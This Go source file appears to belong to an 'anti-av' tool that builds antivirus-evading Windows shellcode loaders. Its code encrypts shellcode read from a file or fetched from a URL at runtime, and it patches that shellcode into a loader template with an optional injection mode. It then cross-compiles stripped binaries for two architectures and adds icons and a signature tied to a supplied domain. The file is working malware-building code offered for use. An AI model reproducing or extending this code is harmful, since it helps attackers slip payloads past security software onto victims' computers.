package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/b1gcat/anti-av/utils"
	"github.com/sirupsen/logrus"
)

var (
	buildDir = filepath.Join("dist", "_tmp")
	copyCmd  = "cp"
	export   = "export"
)

func init() {
	if runtime.GOOS == "windows" {
		copyCmd = "copy"
		export = "set"
	}
	rand.Seed(time.Now().UnixNano())
}

func (c *config) build() {
	c.buildPayload()
	code, err := c.genCode()
	if err != nil {
		logrus.Error(err.Error())
		return
	}
	logrus.Info("[*] Generated Code Done.")
	if err := c.buildCode(code); err != nil {
		logrus.Error(err.Error())
		return
	}
	logrus.Info("[*] Build Done")
}

func (c *config) buildCode(code []byte) error {
	//初始化临时目录
	os.RemoveAll(buildDir)
	os.Mkdir(buildDir, 0755)
	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", c.loader, "*.go"), buildDir)); err != nil {
		return err
	}

	//切换到临时目录编译
	os.Chdir(buildDir)

	ref := Ref{
		CODE:            string(code),
		HOST_OBFUSCATOR: c.hostObfuscator,
		HACK:            "NORMAL",
	}
	if c.inject {
		ref.HACK = "INJECT"
	}

	if err := c.payloadPatch(&ref, "sc.go"); err != nil {
		return err
	}

	if err := c.compile(); err != nil {
		return err
	}

	return nil
}

func (c *config) compile() error {
	buildFlag := `-a -gcflags=-trimpath=$GOPATH -asmflags=-trimpath=$GOPATH  -trimpath -ldflags "-s -w"`
	archs := []string{"amd64", "386"}
	compiler := map[string]string{
		"amd64": "x86_64-w64-mingw32-gcc",
		"386":   "i686-w64-mingw32-gcc",
	}
	for _, arch := range archs {
		utils.CreateIcoPropertity(arch)
		output := fmt.Sprintf("../antiav_windows_%s.exe", arch)
		cmd := fmt.Sprintf(`
			%s CGO_ENABLED=1 && 
			%s CC=%s &&
			%s GOOS=windows && 
			%s GOARCH="%s" && 
			go build %s -o %s`,
			export, export, compiler[arch], export, export, arch, buildFlag, output)
		if err := utils.Cmd(cmd); err != nil {
			return err
		}
		os.Remove("resource_windows.syso")
		utils.SignExecutable(c.domain, output)
	}
	return nil
}

func (c *config) genCode() ([]byte, error) {
	var sc []byte
	var err error

	key := make([]byte, 8)
	if strings.HasPrefix(c.shellcode, "http") {
		sc = []byte(c.shellcode)
		//下载shellcode标记
		rand.Read(key[4:])
	} else {
		sc, err = ioutil.ReadFile(c.shellcode)
		if err != nil {
			return nil, err
		}
		rand.Read(key)
	}

	esc, err := c.payloadEncrypt(key, sc, false)
	if err != nil {
		return nil, err
	}

	codeBuf := make([]string, 0)
	for _, v := range esc {
		codeBuf = append(codeBuf, fmt.Sprintf("0x%02x", v))
	}

	return []byte(strings.Join(codeBuf, ",")), nil
}
